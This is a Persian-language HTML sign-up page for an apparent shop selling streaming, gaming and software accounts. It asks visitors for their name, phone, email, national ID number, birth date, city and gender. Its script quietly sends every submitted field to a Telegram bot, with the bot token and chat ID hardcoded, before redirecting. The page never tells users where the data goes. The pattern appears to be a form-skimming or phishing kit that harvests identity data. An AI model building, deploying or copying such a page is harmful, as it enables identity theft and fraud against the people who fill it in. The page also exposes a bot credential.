<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ثبت نام - فروشگاه اکانت ویژه</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
        }
        .register-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .form-control {
            border-radius: 10px;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            transition: all 0.3s;
        }
        .form-control:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.25);
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea, #764ba2);
            border: none;
            padding: 12px;
            border-radius: 10px;
            font-weight: 600;
            transition: all 0.3s;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-lg-8 col-md-10">
                <div class="register-card p-4 p-md-5">
                    <div class="text-center mb-4">
                        <h2 class="fw-bold text-primary">ثبت نام در فروشگاه ویژه</h2>
                        <p class="text-muted">برای دسترسی به محصولات exclusive ثبت نام کنید</p>
                    </div>

                    <form id="registerForm">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label class="form-label">نام کامل <span class="text-danger">*</span></label>
                                    <input type="text" class="form-control" placeholder="مثال: علی محمدی" required>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">شماره تماس <span class="text-danger">*</span></label>
                                    <input type="tel" class="form-control" placeholder="09xxxxxxxxx" required>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">ایمیل <span class="text-danger">*</span></label>
                                    <input type="email" class="form-control" placeholder="example@email.com" required>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">کد ملی <span class="text-danger">*</span></label>
                                    <input type="text" class="form-control" placeholder="0012345678" maxlength="10" required>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label class="form-label">تاریخ تولد</label>
                                    <input type="date" class="form-control">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">شهر محل سکونت</label>
                                    <select class="form-select">
                                        <option selected>انتخاب شهر...</option>
                                        <option>تهران</option><option>مشهد</option><option>اصفهان</option>
                                        <option>شیراز</option><option>تبریز</option><option>اهواز</option>
                                        <option>کرج</option><option>قم</option><option>رشت</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">جنسیت</label>
                                    <div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="gender" id="male" value="آقا">
                                            <label class="form-check-label" for="male">آقا</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="gender" id="female" value="خانم">
                                            <label class="form-check-label" for="female">خانم</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">علاقه‌مندی‌ها</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="اکانت استریمینگ" id="streaming">
                                        <label class="form-check-label" for="streaming">اکانت استریمینگ</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="اکانت بازی" id="gaming">
                                        <label class="form-check-label" for="gaming">اکانت بازی</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" value="نرم‌افزار" id="software">
                                        <label class="form-check-label" for="software">نرم‌افزار</label>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="form-check mb-4">
                            <input class="form-check-input" type="checkbox" id="agreeTerms" required>
                            <label class="form-check-label" for="agreeTerms">
                                با <a href="#" class="text-primary">قوانین و شرایط</a> موافقم
                            </label>
                        </div>

                        <button type="submit" class="btn btn-primary w-100 py-3">
                            <i class="bi bi-person-plus-fill me-2"></i>
                            تکمیل ثبت نام و ورود به فروشگاه
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('registerForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = {
                name: this.querySelector('input[type="text"]').value,
                phone: this.querySelector('input[type="tel"]').value,
                email: this.querySelector('input[type="email"]').value,
                nationalId: this.querySelector('input[placeholder="0012345678"]').value,
                birthDate: this.querySelector('input[type="date"]').value,
                city: this.querySelector('select').value,
                gender: this.querySelector('input[name="gender"]:checked')?.value || 'ثبت نشده',
                interests: Array.from(this.querySelectorAll('input[type="checkbox"]:checked'))
                    .map(cb => cb.value).join('، ') || 'ثبت نشده'
            };

            sendToTelegram(formData);
            window.location.href = 'products.html';
        });

        function sendToTelegram(data) {
            const message = `👤 **ثبت نام کاربر جدید**\n
📛 نام کامل: ${data.name}
📞 شماره تماس: ${data.phone}
📧 ایمیل: ${data.email}
🆔 کد ملی: ${data.nationalId}
🎂 تاریخ تولد: ${data.birthDate}
🏙️ شهر: ${data.city}
👫 جنسیت: ${data.gender}
❤️ علاقه‌مندی‌ها: ${data.interests}

⏰ زمان ثبت نام: ${new Date().toLocaleString('fa-IR')}`;

            fetch('https://api.telegram.org/bot7690340562:AAEpyw0by4zP40mXIH9K_XTsTeJR0FP1ZPQ/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: '7313667208',
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(error => console.log('Error sending to Telegram:', error));
        }
    </script>
</body>
</html>
